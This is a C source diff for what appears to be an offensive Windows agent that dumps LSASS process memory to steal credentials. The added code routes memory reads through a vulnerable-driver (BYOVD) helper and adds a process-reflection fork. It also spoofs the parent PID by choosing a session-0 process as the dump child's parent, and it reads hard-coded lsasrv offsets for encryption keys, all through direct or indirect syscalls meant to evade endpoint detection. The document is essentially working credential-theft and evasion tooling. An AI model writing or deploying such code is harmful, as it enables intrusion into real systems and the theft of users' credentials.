@@ -8,6 +8,7 @@
 #include "../include/ntdefs.h"
 #include "../include/syscalls.h"
 #include "../include/agent.h"
+#include "../include/byovd.h"
 
 #pragma pack(push, 1)
 
@@ -74,6 +75,18 @@ static inline void zero_mem(void *dst, SIZE_T len) {
     while (len--) *p++ = 0;
 }
 
+static DWORD g_byovd_pid;
+
+static NTSTATUS read_vm(HANDLE proc, PVOID addr, PVOID buf, SIZE_T size, SIZE_T *ret) {
+    if (g_byovd_pid) {
+        SIZE_T br = 0;
+        BOOL ok = byovd_read_vm(g_byovd_pid, addr, buf, size, &br);
+        if (ret) *ret = ok ? size : 0;
+        return ok ? 0 : (NTSTATUS)0xC0000005;
+    }
+    return sys_NtReadVirtualMemory(proc, addr, buf, size, ret);
+}
+
 static DWORD enumerate_modules(HANDLE process, MODULE_INFO *modules, DWORD max_modules) {
     DWORD count = 0;
     PROCESS_BASIC_INFORMATION pbi;
@@ -87,12 +100,12 @@ static DWORD enumerate_modules(HANDLE process, MODULE_INFO *modules, DWORD max_m
 
     PEB peb;
     zero_mem(&peb, sizeof(peb));
-    status = sys_NtReadVirtualMemory(process, pbi.PebBaseAddress, &peb, sizeof(peb), &ret_len);
+    status = read_vm(process, pbi.PebBaseAddress, &peb, sizeof(peb), &ret_len);
     if (status != 0 || !peb.Ldr) return 0;
 
     PEB_LDR_DATA ldr;
     zero_mem(&ldr, sizeof(ldr));
-    status = sys_NtReadVirtualMemory(process, peb.Ldr, &ldr, sizeof(ldr), &ret_len);
+    status = read_vm(process, peb.Ldr, &ldr, sizeof(ldr), &ret_len);
     if (status != 0) return 0;
 
     PVOID list_head = (BYTE*)peb.Ldr + FIELD_OFFSET(PEB_LDR_DATA, InMemoryOrderModuleList);
@@ -103,7 +116,7 @@ static DWORD enumerate_modules(HANDLE process, MODULE_INFO *modules, DWORD max_m
         zero_mem(entry_buf, sizeof(entry_buf));
         PVOID entry_addr = (BYTE*)current_link - 0x10;
 
-        status = sys_NtReadVirtualMemory(process, entry_addr, entry_buf, sizeof(LDR_DATA_TABLE_ENTRY), &ret_len);
+        status = read_vm(process, entry_addr, entry_buf, sizeof(LDR_DATA_TABLE_ENTRY), &ret_len);
         if (status != 0) break;
 
         LDR_DATA_TABLE_ENTRY *entry = (LDR_DATA_TABLE_ENTRY *)entry_buf;
@@ -118,7 +131,7 @@ static DWORD enumerate_modules(HANDLE process, MODULE_INFO *modules, DWORD max_m
                 DWORD name_bytes = entry->FullDllName.Length;
                 if (name_bytes > sizeof(modules[count].name) - 2)
                     name_bytes = sizeof(modules[count].name) - 2;
-                status = sys_NtReadVirtualMemory(process, entry->FullDllName.Buffer,
+                status = read_vm(process, entry->FullDllName.Buffer,
                     modules[count].name, name_bytes, &ret_len);
                 if (status == 0) {
                     modules[count].name_len = name_bytes;
@@ -270,16 +283,36 @@ static BOOL ends_with_ci(const WCHAR *s, DWORD s_chars, const WCHAR *suf, DWORD 
     return TRUE;
 }
 
+/* ── Process reflection (fork) ──────────────────────────── */
+
+static HANDLE fork_process(HANDLE src) {
+    if (!g_addr.NtCreateProcessEx || !g_ssn.NtCreateProcessEx)
+        return NULL;
+
+    HANDLE clone = NULL;
+    NTSTATUS st = sys_NtCreateProcessEx(
+        &clone,
+        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
+        NULL,
+        src,
+        0,
+        NULL, NULL, NULL, 0);
+
+    return NT_SUCCESS(st) ? clone : NULL;
+}
+
 /* ── Main dump function ──────────────────────────────────── */
 
-BOOL dump_lsass(DWORD pid, HANDLE pipe) {
-    HANDLE process = NULL;
+BOOL dump_lsass(DWORD pid, HANDLE pipe, HANDLE preopen, DWORD byovd_pid) {
+    g_byovd_pid = byovd_pid;
+    HANDLE process = preopen;
 
-    /* Find target process without CLIENT_ID */
-    if (g_addr.NtGetNextProcess) {
+    if (!process && g_addr.NtGetNextProcess) {
         HANDLE cursor = NULL;
         HANDLE next = NULL;
-        ACCESS_MASK access = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ;
+        ACCESS_MASK access = byovd_pid
+            ? PROCESS_QUERY_INFORMATION
+            : (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ);
         while (NT_SUCCESS(sys_NtGetNextProcess(cursor, access, 0, 0, &next))) {
             if (cursor) sys_NtClose(cursor);
             cursor = next;
@@ -299,7 +332,8 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
     if (!process)
         return FALSE;
 
-    HANDLE imp_token = impersonate_local_token();
+    HANDLE original = process;
+    HANDLE clone = NULL;
 
     /* Enumerate modules from PEB */
     MODULE_INFO *modules = (MODULE_INFO *)alloc_mem(sizeof(MODULE_INFO) * MAX_MODULES);
@@ -350,7 +384,7 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
         BYTE *ldata = (BYTE *)alloc_mem(0xA000);
         if (ldata) {
             SIZE_T dr = 0;
-            sys_NtReadVirtualMemory(process, (BYTE *)lsasrv_base + 0x175000,
+            read_vm(process, (BYTE *)lsasrv_base + 0x175000,
                                     ldata, 0xA000, &dr);
             if (dr >= 0x8268) {
                 PVOID aes_h = *(PVOID *)(ldata + 0x8258);
@@ -379,7 +413,7 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
                          && cur > 0x10000; chain++) {
                         BYTE entry[0x120];
                         SIZE_T er = 0;
-                        if (sys_NtReadVirtualMemory(process, (PVOID)cur,
+                        if (read_vm(process, (PVOID)cur,
                                 entry, 0x120, &er) != 0 || er < 0x110)
                             break;
 
@@ -411,7 +445,7 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
                         if (cp > 0x10000) {
                             BYTE cl[24];
                             SIZE_T cr = 0;
-                            if (sys_NtReadVirtualMemory(process, (PVOID)cp,
+                            if (read_vm(process, (PVOID)cp,
                                     cl, 24, &cr) == 0 && cr >= 24) {
                                 if (region_count < MAX_REGIONS) {
                                     regions[region_count].base = (PVOID)cp;
@@ -422,7 +456,7 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
                                 if (pp > 0x10000) {
                                     BYTE pm[40];
                                     SIZE_T pr = 0;
-                                    if (sys_NtReadVirtualMemory(process,
+                                    if (read_vm(process,
                                             (PVOID)pp, pm, 40, &pr) == 0
                                         && pr >= 40) {
                                         if (region_count < MAX_REGIONS) {
@@ -598,7 +632,7 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
             SIZE_T to_read = remaining > READ_BUF_SIZE ? READ_BUF_SIZE : remaining;
             SIZE_T bytes_read = 0;
 
-            sys_NtReadVirtualMemory(process, addr, buf, to_read, &bytes_read);
+            read_vm(process, addr, buf, to_read, &bytes_read);
             if (bytes_read == 0) {
                 zero_mem(buf, (SIZE_T)to_read);
                 bytes_read = to_read;
@@ -616,10 +650,51 @@ BOOL dump_lsass(DWORD pid, HANDLE pipe) {
     free_mem(buf);
     free_mem(regions);
     free_mem(modules);
-    revert_impersonation(imp_token);
-    sys_NtClose(process);
+    if (clone) {
+        sys_NtTerminateProcess(clone, 0);
+        sys_NtClose(clone);
+        sys_NtClose(original);
+    } else {
+        sys_NtClose(process);
+    }
 
     return TRUE;
+}
+
+/* ── Find a LOCAL session-0 process for PPID spoofing ────── */
+
+#ifndef PROCESS_CREATE_PROCESS
+#define PROCESS_CREATE_PROCESS 0x0080
+#endif
+
+static HANDLE find_local_parent(DWORD exclude_pid) {
+    HANDLE cursor = NULL;
+    HANDLE next = NULL;
+    ACCESS_MASK access = PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION;
+
+    while (NT_SUCCESS(sys_NtGetNextProcess(cursor, access, 0, 0, &next))) {
+        if (cursor) sys_NtClose(cursor);
+        cursor = next;
+
+        ULONG session_id = 0xFFFFFFFF;
+        ULONG ret;
+        if (!NT_SUCCESS(sys_NtQueryInformationProcess(cursor,
+                ProcessSessionInformation, &session_id, sizeof(session_id), &ret)))
+            continue;
+        if (session_id != 0) continue;
+
+        PROCESS_BASIC_INFORMATION pbi;
+        zero_mem(&pbi, sizeof(pbi));
+        if (NT_SUCCESS(sys_NtQueryInformationProcess(cursor,
+                ProcessBasicInformation, &pbi, sizeof(pbi), &ret))) {
+            DWORD pid = (DWORD)(ULONG_PTR)pbi.UniqueProcessId;
+            if (pid == exclude_pid || pid <= 4) continue;
+        }
+
+        return cursor;
+    }
+    if (cursor) sys_NtClose(cursor);
+    return NULL;
 }
 
 /* ── Parent-spoofed child process for LSASS dump ────────── */
@@ -724,14 +799,26 @@ BOOL spawn_lsass_child(DWORD pid, HANDLE pipe, const wchar_t *output_name) {
     zero_mem(&ci_info, sizeof(ci_info));
     ci_info.Size = sizeof(ci_info);
 
-    /* PS_ATTRIBUTE_LIST: image name only (child inherits our parent) */
+    /* Find a LOCAL session-0 process for PPID spoofing */
+    HANDLE local_parent = find_local_parent(pid);
+
+    /* PS_ATTRIBUTE_LIST: image name + parent process (PPID spoof) */
     PS_ATTRIBUTE_LIST attrs;
     zero_mem(&attrs, sizeof(attrs));
-    attrs.TotalLength = sizeof(SIZE_T) + 1 * sizeof(PS_ATTRIBUTE);
 
+    int attr_count = 1;
     attrs.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
     attrs.Attributes[0].Size = us_img.Length;
     attrs.Attributes[0].ValuePtr = us_img.Buffer;
+
+    if (local_parent) {
+        attrs.Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
+        attrs.Attributes[1].Size = sizeof(HANDLE);
+        attrs.Attributes[1].Value = (ULONG_PTR)local_parent;
+        attr_count = 2;
+    }
+
+    attrs.TotalLength = sizeof(SIZE_T) + attr_count * sizeof(PS_ATTRIBUTE);
 
     /* NtCreateUserProcess — 11 args → indirect_syscall_s7 */
     HANDLE child_proc = NULL, child_thread = NULL;
@@ -747,9 +834,13 @@ BOOL spawn_lsass_child(DWORD pid, HANDLE pipe, const wchar_t *output_name) {
         (PFN_RtlDestroyPP)g_addr.RtlDestroyProcessParameters;
     rtl_destroy(params);
 
+    if (local_parent) sys_NtClose(local_parent);
+
     if (!NT_SUCCESS(st) || !child_proc) {
         DWORD m = 0xDEAD0002; write_pipe(pipe, &m, 4);
         DWORD sc = (DWORD)st; write_pipe(pipe, &sc, 4);
+        DWORD ppid = local_parent ? 1 : 0;
+        write_pipe(pipe, &ppid, 4);
         return FALSE;
     }
 
